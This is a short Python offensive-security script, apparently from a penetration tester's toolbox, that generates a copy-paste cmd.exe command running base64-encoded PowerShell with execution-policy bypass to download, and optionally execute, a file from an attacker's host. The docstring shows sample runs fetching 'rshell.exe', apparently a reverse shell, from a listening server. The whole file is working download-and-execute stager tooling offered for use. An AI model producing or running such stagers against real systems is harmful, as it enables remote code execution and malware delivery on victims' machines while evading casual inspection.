#!/usr/bin/python3
"""
Author: amonsec
Website: https://amonsec.net


Description:
    Generate a simple DOS command that gonna execute a Powershell encoded command who will download a file
from a remote server.


Requirement:
    base64
    argparse


Examples:
redacted@odin: /opt/toolbox/$ python powershell_file_downloader.py -r 10.10.14.21 -p 8080 -f rshell.exe --exec
[+] You can copy/past this command:


cmd.exe /C powershell.exe -Exec Bypass -Nol -Enc aQBlAHgAIAAoA [..snip..] AZQB4AGUAIgApAA==
redacted@odin: /opt/toolbox/$


redacted@odin: /opt/toolbox/$ python powershell_file_downloader.py -r 10.10.14.21 -p 8080 -f rshell.exe
[+] You can copy/past this command:


cmd.exe /C powershell.exe -Exec Bypass -Nol -Enc aQBlAHgAIAAoA [..snip..] AZQB4AGUAIgApAA== > rshell.exe
redacted@odin: /opt/toolbox/$
"""
import base64
import argparse


def generate_command(rhost, rport, file, exec):
    command = ''

    if exec:
        command += 'iex '
    command += '(New-Object Net.WebClient).DownloadString("http://{}:{}/{}")'.format(rhost, rport, file)

    return base64.b64encode(command.encode('utf-16-le')).decode('utf-8')


if __name__ == '__main__':
    """
    Main variables
    """
    parser = argparse.ArgumentParser(description='Generate a powershell command who download a file')
    parser.add_argument('-r', '--rhost', help='Your IP address', required=True)
    parser.add_argument('-p', '--rport', help='Your port who listen', required=True)
    parser.add_argument('-f', '--file', help='The name of the file', required=True)
    parser.add_argument('--exec', help="The uploaded file have to be executed?", action='store_true')
    args = parser.parse_args()

    encoded_powershell_command = generate_command(args.rhost, args.rport, args.file, args.exec)
    cmd_command = 'cmd.exe /C powershell.exe -Exec Bypass -Nol -Enc'
    print('[+] You can copy/past this command:\n\n')

    if args.exec:
        print('{} {}'.format(cmd_command, encoded_powershell_command))
    else:
        print('{} {} > {}'.format(cmd_command, encoded_powershell_command, args.file))


